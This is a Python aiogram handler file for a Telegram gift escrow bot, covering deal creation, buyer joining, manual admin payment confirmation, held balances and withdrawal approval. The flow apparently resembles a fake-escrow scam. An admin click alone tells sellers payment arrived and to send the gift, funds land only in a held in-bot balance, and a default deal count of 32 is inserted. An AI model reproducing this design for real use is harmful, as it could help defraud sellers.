from aiogram import Router, F, Bot
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup

import database as db
from texts import t
from keyboards import (
    main_menu_kb, back_kb, back_cancel_kb, payment_method_kb,
    join_deal_kb, confirm_gift_kb, language_kb, credentials_kb,
    admin_main_kb, admin_deals_kb
)

router = Router()
MAIN_ADMIN_ID = 5461944251


# ================= FSM СОСТОЯНИЯ =================

class CreateDeal(StatesGroup):
    waiting_for_link = State()
    waiting_for_payment = State()
    waiting_for_amount = State()
    waiting_for_details = State()


class EditCredentials(StatesGroup):
    editing_stars = State()
    editing_card = State()
    editing_sbp = State()
    editing_uah = State()
    editing_usdt = State()
    editing_ton = State()


class AdminAdd(StatesGroup):
    waiting_for_id = State()
    waiting_for_remove_id = State()


class Withdraw(StatesGroup):
    waiting_for_amount = State()
    waiting_for_details = State()


# ================= ВСПОМОГАТЕЛЬНЫЕ =================

def L(lang, ru, en):
    return ru if lang == "ru" else en


async def send_main_menu(message_or_call, user_id: int, edit: bool = False):
    user = await db.get_user(user_id)
    lang = user["language"]
    is_admin = bool(user["is_admin"])
    text = t(lang, "welcome")
    kb = main_menu_kb(lang, is_admin)

    if edit and hasattr(message_or_call, "edit_text"):
        await message_or_call.edit_text(text, reply_markup=kb)
    elif hasattr(message_or_call, "message"):
        await message_or_call.message.answer(text, reply_markup=kb)
    else:
        await message_or_call.answer(text, reply_markup=kb)


# ================= СТАРТ И МЕНЮ =================

@router.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext, bot: Bot):
    await state.clear()
    user = await db.get_user(message.from_user.id)
    lang = user["language"]

    args = message.text.split(" ", 1) if message.text else []
    if len(args) > 1 and args[1].startswith("ALX"):
        deal_number = args[1].strip()
        deal = await db.get_deal_by_number(deal_number)

        if not deal:
            await message.answer(
                L(lang,
                  f"❌ Сделка {deal_number} не найдена.\n\n"
                  f"Возможно, она была создана до перезапуска бота, или ссылка устарела.\n"
                  f"💬 Обратитесь в поддержку: @alumixHelp",
                  f"❌ Deal {deal_number} not found.\n\n"
                  f"It may have been created before bot restart, or the link is outdated.\n"
                  f"💬 Contact support: @alumixHelp"),
                reply_markup=back_kb(lang)
            )
            return

        if deal["status"] != "waiting_for_buyer":
            status_msg = {
                "buyer_joined": "покупатель уже присоединился",
                "paid": "сделка оплачена",
                "completed": "сделка завершена",
            }.get(deal["status"], deal["status"])
            await message.answer(
                L(lang,
                  f"⚠️ Сделка {deal_number} больше не доступна: {status_msg}.",
                  f"⚠️ Deal {deal_number} is no longer available: {status_msg}."),
                reply_markup=back_kb(lang)
            )
            return

        # 🔑 ВАЖНО: передаём deal_number в текст!
        text = t(
            lang, "buyer_welcome",
            deal_number=deal_number,
            gift_link=deal["gift_link"],
            amount=deal["amount"],
            currency=deal["currency"],
            seller_username=deal["seller_username"] or "unknown"
        )
        await message.answer(text, reply_markup=join_deal_kb(deal_number, lang))
        return

    await send_main_menu(message, message.from_user.id)


@router.callback_query(F.data == "main_menu")
async def back_to_main(call: CallbackQuery, state: FSMContext):
    await state.clear()
    await send_main_menu(call, call.from_user.id, edit=True)
    await call.answer()


# ================= СОЗДАНИЕ СДЕЛКИ =================

@router.callback_query(F.data == "create_deal")
async def create_deal_start(call: CallbackQuery, state: FSMContext):
    user = await db.get_user(call.from_user.id)
    lang = user["language"]
    await call.message.edit_text(t(lang, "send_gift_link"), reply_markup=back_kb(lang))
    await state.set_state(CreateDeal.waiting_for_link)
    await call.answer()


@router.message(CreateDeal.waiting_for_link)
async def process_gift_link(message: Message, state: FSMContext):
    link = message.text.strip()
    user = await db.get_user(message.from_user.id)
    lang = user["language"]

    if not link.startswith("https://t.me/"):
        await message.answer(t(lang, "invalid_link"))
        return

    await state.update_data(gift_link=link)
    await message.answer(t(lang, "choose_payment"), reply_markup=payment_method_kb(lang))
    await state.set_state(CreateDeal.waiting_for_payment)


@router.callback_query(CreateDeal.waiting_for_payment, F.data.startswith("pay_"))
async def choose_payment(call: CallbackQuery, state: FSMContext):
    currency = call.data.replace("pay_", "").upper()
    await state.update_data(currency=currency)
    user = await db.get_user(call.from_user.id)
    lang = user["language"]
    await call.message.edit_text(t(lang, "enter_amount"), reply_markup=back_cancel_kb(lang))
    await state.set_state(CreateDeal.waiting_for_amount)
    await call.answer()


@router.message(CreateDeal.waiting_for_amount)
async def process_amount(message: Message, state: FSMContext):
    user = await db.get_user(message.from_user.id)
    lang = user["language"]

    try:
        amount = float(message.text.replace(",", "."))
        if amount <= 0:
            raise ValueError
    except ValueError:
        await message.answer(t(lang, "invalid_amount"))
        return

    await state.update_data(amount=amount)
    data = await state.get_data()
    currency = data.get("currency")

    if currency == "RUB":
        await message.answer(t(lang, "enter_card"), reply_markup=back_cancel_kb(lang))
    elif currency == "SBP":
        await message.answer(t(lang, "enter_sbp_phone"), reply_markup=back_cancel_kb(lang))
    elif currency == "UAH":
        await message.answer(t(lang, "enter_uah_card"), reply_markup=back_cancel_kb(lang))
    elif currency == "STARS":
        await message.answer(t(lang, "enter_stars_username"), reply_markup=back_cancel_kb(lang))
    else:
        await message.answer(t(lang, "enter_crypto_wallet"), reply_markup=back_cancel_kb(lang))

    await state.set_state(CreateDeal.waiting_for_details)


@router.message(CreateDeal.waiting_for_details)
async def process_details(message: Message, state: FSMContext, bot: Bot):
    details = message.text.strip()
    data = await state.get_data()
    user = await db.get_user(message.from_user.id)
    lang = user["language"]
    username = message.from_user.username or "user"

    gift_link = data.get("gift_link")
    amount = data.get("amount")
    currency = data.get("currency")

    if not gift_link or not amount or not currency:
        print(f"[FSM] ⚠️ Потеряны данные: gift_link={gift_link}, amount={amount}, currency={currency}")
        await message.answer(
            L(lang,
              "⚠️ <b>Сессия создания сделки была прервана.</b>\n\nПожалуйста, начните заново — нажмите кнопку ниже:",
              "⚠️ <b>Deal creation session was interrupted.</b>\n\nPlease start again — press the button below:"),
            reply_markup=back_kb(lang)
        )
        await state.clear()
        return

    try:
        deal_number = await db.create_deal(
            seller_id=message.from_user.id,
            seller_username=username,
            gift_link=gift_link,
            amount=amount,
            currency=currency,
            payment_details=details
        )

        payment_link = None
        try:
            from trybit import create_invoice, get_payment_link

            crypto_mapping = {
                "USDT": "USDT_TRC20",
                "TON": "TON",
                "RUB": None,
                "SBP": None,
                "UAH": None,
                "STARS": None,
                "USD": None
            }
            cryptocurrency = crypto_mapping.get(currency)

            invoice_result = await create_invoice(
                amount=amount,
                currency=currency if currency in ["USD", "RUB", "SBP", "EUR", "GBP", "UAH"] else "USD",
                order_id=deal_number,
                cryptocurrency=cryptocurrency,
                time_to_pay_hours=24
            )
            if invoice_result:
                payment_link = get_payment_link(invoice_result)
                print(f"[TryBit] ✅ Инвойс создан для сделки {deal_number}: {payment_link}")
        except Exception as e:
            print(f"[TryBit] ⚠️ Ошибка создания инвойса: {e}")

        bot_info = await bot.get_me()
        text = t(
            lang, "deal_created",
            deal_number=deal_number,
            gift_link=gift_link,
            amount=amount,
            currency=currency,
            details=details,
            bot_username=bot_info.username
        )

        if payment_link:
            text += f"\n\n💳 <b>Ссылка для оплаты:</b>\n{payment_link}"
            text += L(lang,
                      "\n\n⏳ Оплата доступна в течение 24 часов.\n🔄 После оплаты администратор подтвердит сделку.",
                      "\n\n⏳ Payment available for 24 hours.\n🔄 Admin will confirm the deal after payment.")

        await message.answer(text, reply_markup=back_kb(lang))

    except Exception as e:
        print(f"[Deal] ❌ Ошибка создания сделки: {e}")
        await message.answer(
            L(lang,
              "❌ Произошла ошибка при создании сделки. Попробуйте ещё раз.",
              "❌ An error occurred while creating the deal. Please try again."),
            reply_markup=back_kb(lang)
        )
    finally:
        await state.clear()


# ================= ПОКУПАТЕЛЬ ПРИСОЕДИНЯЕТСЯ =================

@router.callback_query(F.data.startswith("join:"))
async def buyer_join(call: CallbackQuery, bot: Bot):
    deal_number = call.data.split(":", 1)[1]
    deal = await db.get_deal_by_number(deal_number)

    if not deal:
        await call.answer("❌ Сделка не найдена", show_alert=True)
        return

    if not deal.get("gift_link") or not deal.get("amount") or not deal.get("currency"):
        await call.answer("❌ Сделка повреждена, обратитесь к поддержке", show_alert=True)
        return

    user = await db.get_user(call.from_user.id)
    lang = user["language"]
    username = call.from_user.username or "user"

    await db.join_deal(deal_number, call.from_user.id, username)

    try:
        seller = await db.get_user(deal["seller_id"])
        seller_lang = seller["language"]
        await bot.send_message(
            deal["seller_id"],
            t(
                seller_lang, "buyer_joined",
                buyer_username=username,
                successful_deals=seller.get("successful_deals", 32)
            )
        )
    except Exception as e:
        print(f"[Notify] Ошибка уведомления продавца: {e}")

    try:
        admins = await db.get_admins()
        for admin in admins:
            try:
                await bot.send_message(
                    admin["user_id"],
                    f"👀 Новый покупатель @{username} в сделке {deal_number}\n🎁 {deal.get('gift_link', '?')}"
                )
            except Exception:
                pass
    except Exception:
        pass

    await call.message.edit_text(
        L(lang,
          "✅ Вы присоединились к сделке.\n⏳ Ожидайте подтверждения оплаты администратором.",
          "✅ You joined the deal.\n⏳ Wait for admin payment confirmation."),
        reply_markup=back_kb(lang)
    )
    await call.answer()


# ================= О СЕРВИСЕ / ЯЗЫК =================

@router.callback_query(F.data == "about")
async def about(call: CallbackQuery):
    user = await db.get_user(call.from_user.id)
    lang = user["language"]
    await call.message.edit_text(t(lang, "about_text"), reply_markup=back_kb(lang))
    await call.answer()


@router.callback_query(F.data == "change_lang")
async def change_lang(call: CallbackQuery):
    await call.message.edit_text(
        "🌐 Выберите язык / Choose language",
        reply_markup=language_kb()
    )
    await call.answer()


@router.callback_query(F.data.startswith("lang_"))
async def set_lang(call: CallbackQuery):
    lang = call.data.split("_", 1)[1]
    await db.update_user(call.from_user.id, language=lang)
    await call.message.edit_text(t(lang, "language_changed"), reply_markup=back_kb(lang))
    await call.answer()


# ================= РЕКВИЗИТЫ =================

@router.callback_query(F.data == "credentials")
async def credentials_menu(call: CallbackQuery, state: FSMContext):
    await state.clear()
    user = await db.get_user(call.from_user.id)
    lang = user["language"]
    text = t(
        lang, "credentials_menu",
        stars=user.get("stars_username") or "—",
        card=user.get("card_number") or "—",
        sbp=user.get("sbp_phone") or "—",
        uah=user.get("uah_card_number") or "—",
        usdt=user.get("usdt_wallet") or "—",
        ton=user.get("ton_wallet") or "—"
    )
    await call.message.edit_text(text, reply_markup=credentials_kb(lang))
    await call.answer()


async def show_credentials(message, user_id: int):
    user = await db.get_user(user_id)
    lang = user["language"]
    text = t(
        lang, "credentials_menu",
        stars=user.get("stars_username") or "—",
        card=user.get("card_number") or "—",
        sbp=user.get("sbp_phone") or "—",
        uah=user.get("uah_card_number") or "—",
        usdt=user.get("usdt_wallet") or "—",
        ton=user.get("ton_wallet") or "—"
    )
    await message.answer(text, reply_markup=credentials_kb(lang))


@router.callback_query(F.data == "edit_stars")
async def edit_stars_start(call: CallbackQuery, state: FSMContext):
    user = await db.get_user(call.from_user.id)
    lang = user["language"]
    await call.message.edit_text(t(lang, "enter_stars_username"), reply_markup=back_cancel_kb(lang))
    await state.set_state(EditCredentials.editing_stars)
    await call.answer()


@router.message(EditCredentials.editing_stars)
async def save_stars(message: Message, state: FSMContext):
    await db.update_user(message.from_user.id, stars_username=message.text.strip())
    user = await db.get_user(message.from_user.id)
    await message.answer(t(user["language"], "saved"))
    await state.clear()
    await show_credentials(message, message.from_user.id)


@router.callback_query(F.data == "edit_card")
async def edit_card_start(call: CallbackQuery, state: FSMContext):
    user = await db.get_user(call.from_user.id)
    lang = user["language"]
    await call.message.edit_text(t(lang, "enter_card"), reply_markup=back_cancel_kb(lang))
    await state.set_state(EditCredentials.editing_card)
    await call.answer()


@router.message(EditCredentials.editing_card)
async def save_card(message: Message, state: FSMContext):
    await db.update_user(message.from_user.id, card_number=message.text.strip())
    user = await db.get_user(message.from_user.id)
    await message.answer(t(user["language"], "saved"))
    await state.clear()
    await show_credentials(message, message.from_user.id)


@router.callback_query(F.data == "edit_sbp")
async def edit_sbp_start(call: CallbackQuery, state: FSMContext):
    user = await db.get_user(call.from_user.id)
    lang = user["language"]
    await call.message.edit_text(t(lang, "enter_sbp_phone"), reply_markup=back_cancel_kb(lang))
    await state.set_state(EditCredentials.editing_sbp)
    await call.answer()


@router.message(EditCredentials.editing_sbp)
async def save_sbp(message: Message, state: FSMContext):
    await db.update_user(message.from_user.id, sbp_phone=message.text.strip())
    user = await db.get_user(message.from_user.id)
    await message.answer(t(user["language"], "saved"))
    await state.clear()
    await show_credentials(message, message.from_user.id)


@router.callback_query(F.data == "edit_uah")
async def edit_uah_start(call: CallbackQuery, state: FSMContext):
    user = await db.get_user(call.from_user.id)
    lang = user["language"]
    await call.message.edit_text(t(lang, "enter_uah_card"), reply_markup=back_cancel_kb(lang))
    await state.set_state(EditCredentials.editing_uah)
    await call.answer()


@router.message(EditCredentials.editing_uah)
async def save_uah(message: Message, state: FSMContext):
    await db.update_user(message.from_user.id, uah_card_number=message.text.strip())
    user = await db.get_user(message.from_user.id)
    await message.answer(t(user["language"], "saved"))
    await state.clear()
    await show_credentials(message, message.from_user.id)


@router.callback_query(F.data == "edit_usdt")
async def edit_usdt_start(call: CallbackQuery, state: FSMContext):
    user = await db.get_user(call.from_user.id)
    lang = user["language"]
    await call.message.edit_text(t(lang, "enter_crypto_wallet"), reply_markup=back_cancel_kb(lang))
    await state.set_state(EditCredentials.editing_usdt)
    await call.answer()


@router.message(EditCredentials.editing_usdt)
async def save_usdt(message: Message, state: FSMContext):
    await db.update_user(message.from_user.id, usdt_wallet=message.text.strip())
    user = await db.get_user(message.from_user.id)
    await message.answer(t(user["language"], "saved"))
    await state.clear()
    await show_credentials(message, message.from_user.id)


@router.callback_query(F.data == "edit_ton")
async def edit_ton_start(call: CallbackQuery, state: FSMContext):
    user = await db.get_user(call.from_user.id)
    lang = user["language"]
    await call.message.edit_text(t(lang, "enter_crypto_wallet"), reply_markup=back_cancel_kb(lang))
    await state.set_state(EditCredentials.editing_ton)
    await call.answer()


@router.message(EditCredentials.editing_ton)
async def save_ton(message: Message, state: FSMContext):
    await db.update_user(message.from_user.id, ton_wallet=message.text.strip())
    user = await db.get_user(message.from_user.id)
    await message.answer(t(user["language"], "saved"))
    await state.clear()
    await show_credentials(message, message.from_user.id)


# ================= АДМИН-ПАНЕЛЬ =================

@router.callback_query(F.data == "admin_panel")
async def admin_panel(call: CallbackQuery):
    user = await db.get_user(call.from_user.id)
    if not user["is_admin"]:
        await call.answer("🚫 Доступ запрещён", show_alert=True)
        return
    lang = user["language"]
    await call.message.edit_text("⚙️ Админ панель", reply_markup=admin_main_kb(lang))
    await call.answer()


@router.callback_query(F.data == "admin_deals")
async def admin_deals_list(call: CallbackQuery):
    user = await db.get_user(call.from_user.id)
    if not user["is_admin"]:
        await call.answer("🚫 Доступ запрещён", show_alert=True)
        return
    lang = user["language"]
    deals = await db.get_all_deals()

    header = t(lang, "admin_deals_list") + "\n\n"
    if not deals:
        deals_text = "📭 Сделок пока нет."
    else:
        deals_text = ""
        for d in deals[:20]:
            deals_text += (
                f"🆔 Номер: {d['deal_number']}\n"
                f"🎁 {d['gift_link']}\n"
                f"👤 @{d['seller_username'] or 'unknown'}\n\n"
            )

    await call.message.edit_text(header + deals_text, reply_markup=admin_deals_kb(deals, lang))
    await call.answer()


@router.callback_query(F.data.startswith("confirm_deal:"))
async def admin_confirm_deal(call: CallbackQuery, bot: Bot):
    user = await db.get_user(call.from_user.id)
    if not user["is_admin"]:
        await call.answer("🚫 Доступ запрещён", show_alert=True)
        return

    deal_number = call.data.split(":", 1)[1]
    deal = await db.get_deal_by_number(deal_number)

    if not deal:
        await call.answer("❌ Сделка не найдена", show_alert=True)
        return

    if deal["buyer_id"] is None:
        await call.answer("❌ Покупатель ещё не присоединился к сделке", show_alert=True)
        return

    if deal["status"] in ["paid", "completed"]:
        await call.answer("✅ Сделка уже подтверждена или завершена", show_alert=True)
        return

    await db.confirm_payment(deal_number)
    await db.add_balance(deal["seller_id"], deal["amount"], deal["currency"], deal_number)
    print(f"[ADMIN] Подтверждение сделки {deal_number} админом {call.from_user.id}")

    try:
        await bot.send_message(
            deal["seller_id"],
            f"💸 Покупатель успешно произвел оплату!\n"
            f"🎁 Отправьте подарок: {deal['gift_link']}\n\n"
            f"💰 Сумма {deal['amount']:.2f} {deal['currency']} зачислена на ваш баланс бота.\n"
            f"🔓 Вывод станет доступен через 3 дня.\n\n"
            f"⚠️ После отправки подарка дождитесь подтверждения от покупателя."
        )
    except Exception:
        pass

    try:
        await bot.send_message(
            deal["buyer_id"],
            f"💸 Оплата подтверждена!\n"
            f"🎁 Подарок: {deal['gift_link']}\n"
            f"💰 Сумма: {deal['amount']} {deal['currency']}\n\n"
            f"⏳ Ожидайте получение подарка от продавца.\n"
            f"Когда получите — нажмите кнопку ниже:",
            reply_markup=confirm_gift_kb("ru")
        )
    except Exception:
        pass

    admins = await db.get_admins()
    for admin in admins:
        if admin["user_id"] != call.from_user.id:
            try:
                await bot.send_message(
                    admin["user_id"],
                    f"🛠 Администратор @{call.from_user.username or call.from_user.id} "
                    f"подтвердил оплату по сделке #{deal_number}"
                )
            except Exception:
                pass

    await call.answer("✅ Оплата подтверждена!")
    admin_lang = user["language"]
    await call.message.edit_text(
        f"✅ Сделка #{deal_number} подтверждена!\n\n"
        f"👤 Продавец: @{deal['seller_username']}\n"
        f"🛒 Покупатель: @{deal['buyer_username']}\n"
        f"🎁 Подарок: {deal['gift_link']}\n\n"
        f"📨 Уведомления отправлены обеим сторонам.",
        reply_markup=back_kb(admin_lang)
    )


@router.callback_query(F.data == "confirm_gift")
async def buyer_confirms_gift(call: CallbackQuery, bot: Bot):
    import aiosqlite
    async with aiosqlite.connect(db.DB_PATH) as conn:
        conn.row_factory = aiosqlite.Row
        async with conn.execute(
            "SELECT * FROM deals WHERE buyer_id=? AND status='paid'",
            (call.from_user.id,)
        ) as cur:
            row = await cur.fetchone()
            if not row:
                await call.answer("❌ Нет активной сделки", show_alert=True)
                return
            deal = dict(row)

    await db.complete_deal(deal["deal_number"])

    try:
        await bot.send_message(
            deal["seller_id"],
            "✅ Сделка завершена! Средства переведены."
        )
    except Exception:
        pass

    await call.message.edit_text("🎉 Сделка успешно завершена!")
    await call.answer()


# ================= ГЛАВНЫЙ АДМИН: АДМИНЫ =================

@router.callback_query(F.data == "admin_add")
async def admin_add_start(call: CallbackQuery, state: FSMContext):
    if call.from_user.id != MAIN_ADMIN_ID:
        await call.answer("🚫 Только главный администратор", show_alert=True)
        return
    user = await db.get_user(call.from_user.id)
    lang = user["language"]
    await call.message.edit_text(t(lang, "enter_admin_id"), reply_markup=back_cancel_kb(lang))
    await state.set_state(AdminAdd.waiting_for_id)
    await call.answer()


@router.message(AdminAdd.waiting_for_id)
async def admin_add_process(message: Message, state: FSMContext):
    if message.from_user.id != MAIN_ADMIN_ID:
        return
    try:
        admin_id = int(message.text.strip())
    except ValueError:
        await message.answer("❌ Введите корректный числовой ID")
        return

    await db.add_admin(admin_id)
    user = await db.get_user(message.from_user.id)
    lang = user["language"]
    await message.answer(t(lang, "admin_added"))
    await state.clear()
    await message.answer("⚙️ Админ панель", reply_markup=admin_main_kb(lang))


@router.callback_query(F.data == "admin_remove")
async def admin_remove_start(call: CallbackQuery, state: FSMContext):
    if call.from_user.id != MAIN_ADMIN_ID:
        await call.answer("🚫 Только главный администратор", show_alert=True)
        return
    user = await db.get_user(call.from_user.id)
    lang = user["language"]
    await call.message.edit_text(t(lang, "enter_admin_remove_id"), reply_markup=back_cancel_kb(lang))
    await state.set_state(AdminAdd.waiting_for_remove_id)
    await call.answer()


@router.message(AdminAdd.waiting_for_remove_id)
async def admin_remove_process(message: Message, state: FSMContext):
    if message.from_user.id != MAIN_ADMIN_ID:
        return
    try:
        admin_id = int(message.text.strip())
    except ValueError:
        await message.answer("❌ Введите корректный числовой ID")
        return

    if admin_id == MAIN_ADMIN_ID:
        await message.answer("🚫 Нельзя удалить главного администратора")
        return

    await db.remove_admin(admin_id)
    user = await db.get_user(message.from_user.id)
    lang = user["language"]
    await message.answer(t(lang, "admin_removed"))
    await state.clear()
    await message.answer("⚙️ Админ панель", reply_markup=admin_main_kb(lang))


@router.callback_query(F.data == "admin_list")
async def admin_list(call: CallbackQuery):
    if call.from_user.id != MAIN_ADMIN_ID:
        await call.answer("🚫 Только главный администратор", show_alert=True)
        return

    admins = await db.get_admins()
    text = "👥 Список администраторов:\n\n"
    for a in admins:
        text += f"🆔 {a['user_id']} — @{a['username'] or 'нет'}\n"

    await call.message.edit_text(text, reply_markup=back_kb("ru"))
    await call.answer()


# ================= ВНУТРЕННИЙ БАЛАНС =================

@router.callback_query(F.data == "balance")
async def balance_menu(call: CallbackQuery, state: FSMContext):
    await state.clear()
    user = await db.get_user(call.from_user.id)
    lang = user["language"]
    info, hold_until = await db.get_balance_info(call.from_user.id)

    if not info or all(v["total"] <= 0 for v in info.values()):
        await call.message.edit_text(
            L(lang,
              "💰 Ваш баланс пуст.\n\nСредства появляются после подтверждения оплаты администратором в сделке.",
              "💰 Your balance is empty.\n\nFunds appear after admin confirms payment in a deal."),
            reply_markup=back_kb(lang)
        )
        await call.answer()
        return

    lines = [L(lang, "💰 Ваш баланс:\n", "💰 Your balance:\n")]
    kb = []
    for cur, v in info.items():
        lines.append(f"💳 {cur}: {v['total']:.2f}")
        if v["available"] < v["total"]:
            lines.append(L(lang, f"   🔓 Доступно: {v['available']:.2f}", f"   🔓 Available: {v['available']:.2f}"))
        if v["available"] > 0:
            kb.append([InlineKeyboardButton(
                text=L(lang, f"💸 Вывести {cur}", f"💸 Withdraw {cur}"),
                callback_data=f"withdraw:{cur}"
            )])

    if hold_until:
        date_str = hold_until[:16].replace("T", " ")
        lines.append("")
        lines.append(L(lang,
            f"🔒 Часть средств на холде до {date_str}.\n💬 Досрочный вывод — через поддержку @alumixHelp",
            f"🔒 Part of funds on hold until {date_str}.\n💬 Early withdrawal — via support @alumixHelp"))

    kb.append([InlineKeyboardButton(text="◀️ " + t(lang, "back"), callback_data="main_menu")])
    await call.message.edit_text("\n".join(lines), reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
    await call.answer()


@router.callback_query(F.data.startswith("withdraw:"))
async def withdraw_start(call: CallbackQuery, state: FSMContext):
    currency = call.data.split(":", 1)[1]
    user = await db.get_user(call.from_user.id)
    lang = user["language"]
    info, hold_until = await db.get_balance_info(call.from_user.id)
    v = info.get(currency)

    if not v or v["available"] <= 0:
        date_str = hold_until[:16].replace("T", " ") if hold_until else "—"
        await call.message.edit_text(
            L(lang,
              f"🔒 Средства на холде до {date_str}.\n\n💬 Нужен досрочный вывод? Обратитесь в поддержку: @alumixHelp",
              f"🔒 Funds on hold until {date_str}.\n\n💬 Need early withdrawal? Contact support: @alumixHelp"),
            reply_markup=back_kb(lang)
        )
        await call.answer()
        return

    await state.update_data(currency=currency, available=v["available"])
    await call.message.edit_text(
        L(lang,
          f"💸 Введите сумму для вывода\n\n🔓 Доступно: {v['available']:.2f} {currency}",
          f"💸 Enter withdrawal amount\n\n🔓 Available: {v['available']:.2f} {currency}"),
        reply_markup=back_cancel_kb(lang)
    )
    await state.set_state(Withdraw.waiting_for_amount)
    await call.answer()


@router.message(Withdraw.waiting_for_amount)
async def withdraw_amount(message: Message, state: FSMContext):
    data = await state.get_data()
    user = await db.get_user(message.from_user.id)
    lang = user["language"]
    available = data.get("available", 0)
    currency = data.get("currency", "")

    try:
        amount = float(message.text.replace(",", "."))
        if amount <= 0 or amount > available:
            raise ValueError
    except ValueError:
        await message.answer(L(lang,
            f"❌ Введите сумму от 0 до {available:.2f} {currency}",
            f"❌ Enter amount from 0 to {available:.2f} {currency}"))
        return

    await state.update_data(amount=amount)
    await message.answer(L(lang,
        "🏦 Введите реквизиты для вывода\n\n(номер карты, телефон СБП, кошелёк USDT/TON или @username для Stars)",
        "🏦 Enter payment details\n\n(card number, SBP phone, USDT/TON wallet, or @username for Stars)"),
        reply_markup=back_cancel_kb(lang))
    await state.set_state(Withdraw.waiting_for_details)


@router.message(Withdraw.waiting_for_details)
async def withdraw_details(message: Message, state: FSMContext, bot: Bot):
    details = message.text.strip()
    data = await state.get_data()
    user = await db.get_user(message.from_user.id)
    lang = user["language"]

    w_id = await db.create_withdrawal(
        user_id=message.from_user.id,
        username=message.from_user.username or "user",
        amount=data["amount"],
        currency=data["currency"],
        details=details
    )

    admins = await db.get_admins()
    for admin in admins:
        try:
            await bot.send_message(
                admin["user_id"],
                f"💸 Новая заявка на вывод #{w_id}\n\n"
                f"👤 @{message.from_user.username or message.from_user.id} (ID: {message.from_user.id})\n"
                f"💰 {data['amount']:.2f} {data['currency']}\n"
                f"🏦 {details}"
            )
        except Exception:
            pass

    await message.answer(L(lang,
        f"✅ Заявка на вывод создана!\n\n💰 Сумма: {data['amount']:.2f} {data['currency']}\n🏦 Реквизиты: {details}\n\n⏳ Статус: ожидает подтверждения администратором.\nСредства зарезервированы до решения.",
        f"✅ Withdrawal request created!\n\n💰 Amount: {data['amount']:.2f} {data['currency']}\n🏦 Details: {details}\n\n⏳ Status: pending admin approval.\nFunds are reserved until decision."),
        reply_markup=back_kb(lang))
    await state.clear()


# ================= АДМИН: ЗАЯВКИ НА ВЫВОД =================

async def render_withdrawals(call: CallbackQuery):
    withdrawals = await db.get_pending_withdrawals()
    if not withdrawals:
        await call.message.edit_text("📭 Заявок на вывод нет.", reply_markup=back_kb("ru"))
        return

    lines = ["💸 Заявки на вывод:\n"]
    kb = []
    for w in withdrawals:
        lines.append(
            f"#{w['id']} | @{w['username']}\n"
            f"💰 {w['amount']:.2f} {w['currency']}\n"
            f"🏦 {w['details']}\n"
        )
        kb.append([
            InlineKeyboardButton(text=f"✅ Одобрить #{w['id']}", callback_data=f"wapprove:{w['id']}"),
            InlineKeyboardButton(text=f"❌ Отклонить #{w['id']}", callback_data=f"wreject:{w['id']}"),
        ])
    kb.append([InlineKeyboardButton(text="◀️ Назад", callback_data="admin_panel")])
    await call.message.edit_text("\n".join(lines), reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))


@router.callback_query(F.data == "admin_withdrawals")
async def admin_withdrawals(call: CallbackQuery):
    user = await db.get_user(call.from_user.id)
    if not user["is_admin"]:
        await call.answer("🚫 Доступ запрещён", show_alert=True)
        return
    await render_withdrawals(call)
    await call.answer()


@router.callback_query(F.data.startswith("wapprove:"))
async def approve_withdrawal(call: CallbackQuery, bot: Bot):
    user = await db.get_user(call.from_user.id)
    if not user["is_admin"]:
        await call.answer("🚫 Доступ запрещён", show_alert=True)
        return
    w_id = int(call.data.split(":", 1)[1])
    w = await db.get_withdrawal(w_id)
    if not w or w["status"] != "pending":
        await call.answer("❌ Заявка не найдена или уже обработана", show_alert=True)
        return
    await db.update_withdrawal_status(w_id, "approved")
    try:
        await bot.send_message(w["user_id"],
            f"✅ Заявка на вывод #{w_id} одобрена!\n💰 {w['amount']:.2f} {w['currency']} отправлены на реквизиты:\n🏦 {w['details']}")
    except Exception:
        pass
    await call.answer("✅ Заявка одобрена")
    await render_withdrawals(call)


@router.callback_query(F.data.startswith("wreject:"))
async def reject_withdrawal(call: CallbackQuery, bot: Bot):
    user = await db.get_user(call.from_user.id)
    if not user["is_admin"]:
        await call.answer("🚫 Доступ запрещён", show_alert=True)
        return
    w_id = int(call.data.split(":", 1)[1])
    w = await db.get_withdrawal(w_id)
    if not w or w["status"] != "pending":
        await call.answer("❌ Заявка не найдена или уже обработана", show_alert=True)
        return
    await db.update_withdrawal_status(w_id, "rejected")
    try:
        await bot.send_message(w["user_id"],
            f"❌ Заявка на вывод #{w_id} отклонена.\n💰 Средства возвращены на ваш баланс.\n💬 Вопросы — в поддержку @alumixHelp")
    except Exception:
        pass
    await call.answer("❌ Заявка отклонена")
    await render_withdrawals(call)


# ================= ИНФО О СДЕЛКЕ / ОТМЕНА =================

@router.callback_query(F.data.startswith("deal_info:"))
async def deal_info(call: CallbackQuery):
    user = await db.get_user(call.from_user.id)
    if not user["is_admin"]:
        await call.answer("🚫 Доступ запрещён", show_alert=True)
        return

    deal_number = call.data.split(":", 1)[1]
    deal = await db.get_deal_by_number(deal_number)

    if not deal:
        await call.answer("❌ Сделка не найдена", show_alert=True)
        return

    status_map = {
        "waiting_for_buyer": "🟡 Ожидает покупателя",
        "buyer_joined": "🔵 Покупатель присоединился",
        "paid": "✅ Оплачена",
        "completed": "🏁 Завершена"
    }

    text = (
        f"📋 Информация о сделке #{deal_number}\n\n"
        f"🎁 Подарок: {deal['gift_link']}\n"
        f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
        f"💳 Реквизиты: {deal['payment_details']}\n\n"
        f"👤 Продавец: @{deal['seller_username'] or 'unknown'} (ID: {deal['seller_id']})\n"
        f"🛒 Покупатель: @{deal['buyer_username'] or '—'} (ID: {deal['buyer_id'] or '—'})\n\n"
        f"📊 Статус: {status_map.get(deal['status'], deal['status'])}\n"
        f"📅 Создана: {deal['created_at'][:19]}"
    )

    kb = []
    if deal["buyer_id"] and deal["status"] not in ["paid", "completed"]:
        kb.append([InlineKeyboardButton(
            text="💸 Подтвердить оплату вручную",
            callback_data=f"confirm_deal:{deal_number}"
        )])
    kb.append([InlineKeyboardButton(text="◀️ К списку сделок", callback_data="admin_deals")])

    await call.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
    await call.answer()


@router.callback_query(F.data == "cancel_state")
async def cancel_handler(call: CallbackQuery, state: FSMContext):
    await state.clear()
    user = await db.get_user(call.from_user.id)
    lang = user["language"]
    await call.message.edit_text(t(lang, "cancelled"), reply_markup=back_kb(lang))
    await call.answer()


